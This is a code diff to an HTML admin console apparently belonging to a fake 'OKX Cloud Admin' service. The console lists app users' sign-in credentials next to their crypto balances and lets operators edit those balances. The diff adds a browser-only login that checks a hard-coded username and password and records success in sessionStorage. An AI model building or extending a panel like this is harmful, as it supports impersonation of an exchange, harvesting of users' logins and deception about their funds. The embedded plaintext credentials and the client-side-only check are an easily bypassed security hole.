@@ -56,12 +56,17 @@
                     </div>
                     
                     <div class="flex items-center space-x-4">
-                        <div id="connectionStatusBadge" class="flex items-center space-x-2 px-3 py-1.5 rounded-full bg-red-950/40 text-red-400 border border-red-800/60 text-xs">
-                            <span class="h-2 w-2 rounded-full bg-red-500 animate-pulse"></span>
-                            <span>DB Disconnected</span>
+                        <div id="headerDbStatusWrapper" class="hidden flex items-center space-x-4">
+                            <div id="connectionStatusBadge" class="flex items-center space-x-2 px-3 py-1.5 rounded-full bg-red-950/40 text-red-400 border border-red-800/60 text-xs">
+                                <span class="h-2 w-2 rounded-full bg-red-500 animate-pulse"></span>
+                                <span>DB Disconnected</span>
+                            </div>
+                            <button id="disconnectDbBtn" class="hidden text-xs text-gray-400 hover:text-white border border-darkBorder hover:bg-darkBorder px-3 py-1.5 rounded-lg transition-colors">
+                                <i class="fa-solid fa-link-slash mr-1"></i> Disconnect DB
+                            </button>
                         </div>
-                        <button id="disconnectDbBtn" class="hidden text-xs text-gray-400 hover:text-white border border-darkBorder hover:bg-darkBorder px-3 py-1.5 rounded-lg transition-colors">
-                            <i class="fa-solid fa-link-slash mr-1"></i> Disconnect DB
+                        <button id="adminLogoutBtn" class="hidden text-xs text-gray-400 hover:text-white border border-darkBorder hover:bg-darkBorder px-3 py-1.5 rounded-lg transition-colors">
+                            <i class="fa-solid fa-right-from-bracket mr-1"></i> Logout
                         </button>
                     </div>
                 </div>
@@ -71,6 +76,46 @@
         <!-- Main Workspace -->
         <main class="flex-grow max-w-7xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-8">
             
+            <!-- Login Screen (Shown if not logged in) -->
+            <div id="loginPanel" class="max-w-md mx-auto my-12 bg-darkCard border border-darkBorder rounded-2xl p-8 shadow-2xl">
+                <div class="text-center mb-6">
+                    <div class="w-16 h-16 rounded-2xl bg-okxGreen flex items-center justify-center text-black font-extrabold text-3xl tracking-tighter mx-auto mb-4">
+                        O
+                    </div>
+                    <h2 class="display-font text-2xl font-bold text-white">Console Secure Login</h2>
+                    <p class="text-gray-400 text-xs mt-1">Access to OKX Cloud Admin is restricted.</p>
+                </div>
+                
+                <form id="loginForm" class="space-y-4">
+                    <div>
+                        <label class="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">Username</label>
+                        <div class="relative">
+                            <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center text-gray-500">
+                                <i class="fa-solid fa-user text-xs"></i>
+                            </span>
+                            <input type="text" id="loginUsername" required placeholder="Enter username" class="w-full bg-black border border-darkBorder rounded-xl pl-10 pr-4 py-3 text-white focus:outline-none focus:border-okxGreen transition-colors text-sm">
+                        </div>
+                    </div>
+                    <div>
+                        <label class="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">Password</label>
+                        <div class="relative">
+                            <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center text-gray-500">
+                                <i class="fa-solid fa-lock text-xs"></i>
+                            </span>
+                            <input type="password" id="loginPassword" required placeholder="Enter password" class="w-full bg-black border border-darkBorder rounded-xl pl-10 pr-4 py-3 text-white focus:outline-none focus:border-okxGreen transition-colors text-sm">
+                        </div>
+                    </div>
+                    <div id="loginError" class="hidden text-xs text-red-400 bg-red-950/20 border border-red-900/40 p-3 rounded-xl flex items-center space-x-2">
+                        <i class="fa-solid fa-triangle-exclamation"></i>
+                        <span>Invalid username or password.</span>
+                    </div>
+                    <button type="submit" class="w-full bg-okxGreen text-black font-bold py-3 rounded-xl hover:bg-white transition-colors flex items-center justify-center space-x-2 text-sm mt-2">
+                        <i class="fa-solid fa-shield-halved"></i>
+                        <span>Authenticate Portal</span>
+                    </button>
+                </form>
+            </div>
+
             <!-- Connection Wizard Panel (Shown if DB not connected) -->
             <div id="connectionWizardPanel" class="bg-darkCard border border-darkBorder rounded-2xl p-6 sm:p-10 shadow-2xl mb-8">
                 <div class="max-w-3xl">
@@ -134,6 +179,54 @@
             <!-- Active Connected Dashboard (Hidden by default until connected) -->
             <div id="dashboardContainer" class="hidden space-y-8">
                 
+                <!-- Users Directory Section -->
+                <div class="bg-darkCard border border-darkBorder rounded-2xl shadow-lg overflow-hidden">
+                    <!-- Section Header -->
+                    <div class="p-6 border-b border-darkBorder sm:flex sm:items-center sm:justify-between space-y-4 sm:space-y-0">
+                        <div>
+                            <h2 class="display-font text-xl font-bold text-white flex items-center space-x-2">
+                                <i class="fa-solid fa-address-book text-okxGreen text-lg"></i>
+                                <span>Users Directory</span>
+                            </h2>
+                            <p class="text-gray-400 text-xs mt-1">Real-time database records linked to user mobile applications</p>
+                        </div>
+                        
+                        <div class="flex items-center space-x-3">
+                            <div class="relative">
+                                <span class="absolute inset-y-0 left-0 pl-3 flex items-center text-gray-400">
+                                    <i class="fa-solid fa-magnifying-glass text-xs"></i>
+                                </span>
+                                <input type="text" id="userSearchInput" placeholder="Search by email, name..." class="bg-black border border-darkBorder rounded-lg pl-9 pr-4 py-2 text-white focus:outline-none focus:border-okxGreen text-xs w-60 transition-all">
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Database Table -->
+                    <div class="overflow-x-auto">
+                        <table class="min-w-full divide-y divide-darkBorder text-sm">
+                            <thead class="bg-black/40 text-gray-400 text-xs uppercase tracking-wider text-left font-semibold">
+                                <tr>
+                                    <th class="px-6 py-4">User Profile</th>
+                                    <th class="px-6 py-4">Sign-in Credentials</th>
+                                    <th class="px-6 py-4">Primary Balances</th>
+                                    <th class="px-6 py-4">Est. Value (USD)</th>
+                                    <th class="px-6 py-4">Last Synced</th>
+                                    <th class="px-6 py-4 text-right">Actions</th>
+                                </tr>
+                            </thead>
+                            <tbody id="usersTableBody" class="divide-y divide-darkBorder bg-darkCard/20">
+                                <!-- Loaded dynamically -->
+                                <tr>
+                                    <td colspan="6" class="px-6 py-12 text-center text-gray-400 text-xs">
+                                        <i class="fa-solid fa-circle-notch animate-spin text-lg text-okxGreen mb-2 block mx-auto"></i>
+                                        Syncing cloud database records...
+                                    </td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
                 <!-- Summary Metrics Bar -->
                 <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
                     <div class="bg-darkCard border border-darkBorder rounded-2xl p-5 flex items-center space-x-4">
@@ -281,53 +374,6 @@
                     </div>
                 </div>
 
-                <!-- Users Directory Section -->
-                <div class="bg-darkCard border border-darkBorder rounded-2xl shadow-lg overflow-hidden">
-                    <!-- Section Header -->
-                    <div class="p-6 border-b border-darkBorder sm:flex sm:items-center sm:justify-between space-y-4 sm:space-y-0">
-                        <div>
-                            <h2 class="display-font text-xl font-bold text-white flex items-center space-x-2">
-                                <i class="fa-solid fa-address-book text-okxGreen text-lg"></i>
-                                <span>Users Directory</span>
-                            </h2>
-                            <p class="text-gray-400 text-xs mt-1">Real-time database records linked to user mobile applications</p>
-                        </div>
-                        
-                        <div class="flex items-center space-x-3">
-                            <div class="relative">
-                                <span class="absolute inset-y-0 left-0 pl-3 flex items-center text-gray-400">
-                                    <i class="fa-solid fa-magnifying-glass text-xs"></i>
-                                </span>
-                                <input type="text" id="userSearchInput" placeholder="Search by email, name..." class="bg-black border border-darkBorder rounded-lg pl-9 pr-4 py-2 text-white focus:outline-none focus:border-okxGreen text-xs w-60 transition-all">
-                            </div>
-                        </div>
-                    </div>
-
-                    <!-- Database Table -->
-                    <div class="overflow-x-auto">
-                        <table class="min-w-full divide-y divide-darkBorder text-sm">
-                            <thead class="bg-black/40 text-gray-400 text-xs uppercase tracking-wider text-left font-semibold">
-                                <tr>
-                                    <th class="px-6 py-4">User Profile</th>
-                                    <th class="px-6 py-4">Sign-in Credentials</th>
-                                    <th class="px-6 py-4">Primary Balances</th>
-                                    <th class="px-6 py-4">Est. Value (USD)</th>
-                                    <th class="px-6 py-4">Last Synced</th>
-                                    <th class="px-6 py-4 text-right">Actions</th>
-                                </tr>
-                            </thead>
-                            <tbody id="usersTableBody" class="divide-y divide-darkBorder bg-darkCard/20">
-                                <!-- Loaded dynamically -->
-                                <tr>
-                                    <td colspan="6" class="px-6 py-12 text-center text-gray-400 text-xs">
-                                        <i class="fa-solid fa-circle-notch animate-spin text-lg text-okxGreen mb-2 block mx-auto"></i>
-                                        Syncing cloud database records...
-                                    </td>
-                                </tr>
-                            </tbody>
-                        </table>
-                    </div>
-                </div>
             </div>
         </main>
         
@@ -476,10 +522,39 @@
         const searchInput = document.getElementById('userSearchInput');
         const modal = document.getElementById('editBalancesModal');
 
+        // Authentication logic
+        function checkAuth() {
+            const isAuth = sessionStorage.getItem('admin_authenticated') === 'true';
+            if (isAuth) {
+                document.getElementById('loginPanel').classList.add('hidden');
+                document.getElementById('headerDbStatusWrapper').classList.remove('hidden');
+                document.getElementById('adminLogoutBtn').classList.remove('hidden');
+                
+                // Show panels depending on whether database is connected
+                if (db) {
+                    wizardPanel.classList.add('hidden');
+                    dashboard.classList.remove('hidden');
+                } else {
+                    wizardPanel.classList.remove('hidden');
+                    dashboard.classList.add('hidden');
+                }
+            } else {
+                document.getElementById('loginPanel').classList.remove('hidden');
+                document.getElementById('headerDbStatusWrapper').classList.add('hidden');
+                document.getElementById('adminLogoutBtn').classList.add('hidden');
+                wizardPanel.classList.add('hidden');
+                dashboard.classList.add('hidden');
+            }
+        }
+
         // Initial setup check
         document.addEventListener('DOMContentLoaded', () => {
             fetchLivePrices();
             setInterval(fetchLivePrices, 15000); // Automatically refresh prices every 15 seconds
+            
+            // Apply authentication screen
+            checkAuth();
+            
             const savedConfig = localStorage.getItem('okx_db_config');
             if (savedConfig) {
                 const config = JSON.parse(savedConfig);
@@ -491,6 +566,28 @@
                 const defaultAppId = "1:1004621666717:android:940450615c374d4bf17774";
                 connectToFirebase(defaultProjectId, defaultApiKey, defaultAppId);
             }
+        });
+
+        // Login submit form handling
+        document.getElementById('loginForm').addEventListener('submit', (e) => {
+            e.preventDefault();
+            const username = document.getElementById('loginUsername').value.trim();
+            const password = document.getElementById('loginPassword').value.trim();
+            const loginError = document.getElementById('loginError');
+            
+            if (username === 'alpha02' && password === 'Thecorrupt1.ke') {
+                sessionStorage.setItem('admin_authenticated', 'true');
+                loginError.classList.add('hidden');
+                checkAuth();
+            } else {
+                loginError.classList.remove('hidden');
+            }
+        });
+
+        // Admin logout action
+        document.getElementById('adminLogoutBtn').addEventListener('click', () => {
+            sessionStorage.removeItem('admin_authenticated');
+            checkAuth();
         });
 
         // Connection submit
@@ -512,9 +609,8 @@
             db = null;
             firebaseApp = null;
             
-            // UI Toggle
-            wizardPanel.classList.remove('hidden');
-            dashboard.classList.add('hidden');
+            // Update UI
+            checkAuth();
             disconnectBtn.classList.add('hidden');
             
             badge.innerHTML = `<span class="h-2 w-2 rounded-full bg-red-500 animate-pulse"></span><span>DB Disconnected</span>`;
@@ -609,10 +705,10 @@
                 badge.innerHTML = `<span class="h-2 w-2 rounded-full bg-okxGreen animate-pulse"></span><span>Connected to ${projectId}</span>`;
                 badge.className = "flex items-center space-x-2 px-3 py-1.5 rounded-full bg-emerald-950/40 text-okxGreen border border-emerald-800/60 text-xs";
                 
-                // Show panels
-                wizardPanel.classList.add('hidden');
-                dashboard.classList.remove('hidden');
                 disconnectBtn.classList.remove('hidden');
+                
+                // Refresh UI according to auth state
+                checkAuth();
                 
                 // Start subscribing to Firebase changes
                 listenToUsers();
